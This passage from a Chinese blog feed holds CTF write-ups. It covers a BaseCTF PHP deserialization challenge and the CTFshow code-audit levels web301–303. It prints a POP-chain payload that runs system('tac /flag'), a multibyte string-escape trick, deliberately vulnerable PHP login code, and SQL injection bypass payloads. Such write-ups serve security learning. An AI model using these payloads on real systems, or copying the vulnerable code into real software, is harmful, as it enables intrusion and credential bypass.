variable">$this</span><span class="token operator">-></span><span class="token property">r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">R</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">e</span><span class="token operator">-></span><span class="token property">r</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'2'</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// a:2:&#123;i:1;O:6:"Hacker":3:&#123;s:5:"start";O:1:"C":1:&#123;s:1:"c";O:1:"T":1:&#123;s:1:"t";O:1:"F":1:&#123;s:1:"f";O:1:"E":1:&#123;s:1:"e";O:1:"R":1:&#123;s:1:"r";s:20:"system('tac /flag');";&#125;&#125;&#125;&#125;&#125;s:3:"end";N;s:8:"username";R:9;&#125;i:1;N;&#125;</span></span></code></pre><p>将最后<code>i:2;N;</code>替换为<code>i:1;N;</code>利用gc回收使<code>__destruct</code>提前触发</p><p>特殊变量名 <code>ez_ser.from_you</code>，传入<code>ez[ser.from_you</code>即可绕过</p><p>接下来就是字符串逃逸</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>参考链接 <a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">CTFshow_XGCTF_Ezzz_php</a>  <a href="https://www.cnblogs.com/gxngxngxn/p/18187578">mb_strpos与mb_substr执行差异导致的漏洞</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</code></pre><p><img src="ez_php.png" loading="lazy"></p><p><img src="ez_php2.png" loading="lazy"></p><p>于是构造绕过之前多余字符串</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">210</span><span class="token punctuation">:</span>"<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>substr<span class="token operator">=</span><span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">&amp;</span>ez<span class="token punctuation">[</span>ser<span class="token operator">.</span>from_you<span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"T"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"F"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"E"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"R"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"end"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token constant">R</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-代码审计</title>
      <link href="/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="web301-310"><a href="#web301-310" class="headerlink" title="web301-310"></a>web301-310</h3><h4 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select sds_password from sds_user where sds_username='"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token string double-quoted-string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>没有任何过滤</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span>checklogin<span class="token operator">.</span>phpuserid<span class="token operator">=</span><span class="token number">1</span>' union select <span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h4><p>Hint:</p><pre class="language-php" data-language="php"><code class="language-php">修改的地方：<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"># fun.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>按照同样逻辑构造即可</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// string(32) "d9c77c4e454869d5d8da3b4be79694d3"</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span>checklogin<span class="token operator">.</span>phpuserid<span class="token operator">=</span><span class="token number">1</span><span class="token string single-quoted-string">' union select '</span>d9c77c4e454869d5d8da3b4be79694d3' <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h4><p>checklogin.php限制了userid的长度</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>fun.php和sds_user.sql给了弱密码提示 <code>admin/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"># fun.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 27151b7b1ad51a38ea66b1529cde5ee4</span><span class="token delimiter important">?></span></span># sds_user.sql-- ------------------------------ Records of sds_user-- ----------------------------INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');</code></pre><pre class="language-php" data-language="php"><code class="language-php"># dptadd.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">//注入点</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$dpt_name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_address</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_build_year</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_has_cert</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"on"</span><span class="token operator">?</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token variable">$dpt_cert_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_telephone_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into sds_dpt set sds_name='"</span><span class="token operator">.</span><span class="token variable">$dpt_name</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_address ='"</span><span class="token operator">.</span><span class="token variable">$dpt_address</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_build_date='"</span><span class="token operator">.</span><span class="token variable">$dpt_build_year</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_have_safe_card='"</span><span class="token operator">.</span><span class="token variable">$dpt_has_cert</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_safe_card_num='"</span><span class="token operator">.</span><span class="token variable">$dpt_cert_number</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_telephone='"</span><span class="token operator">.</span><span class="token variable">$dpt_telephone_number</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">===</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token 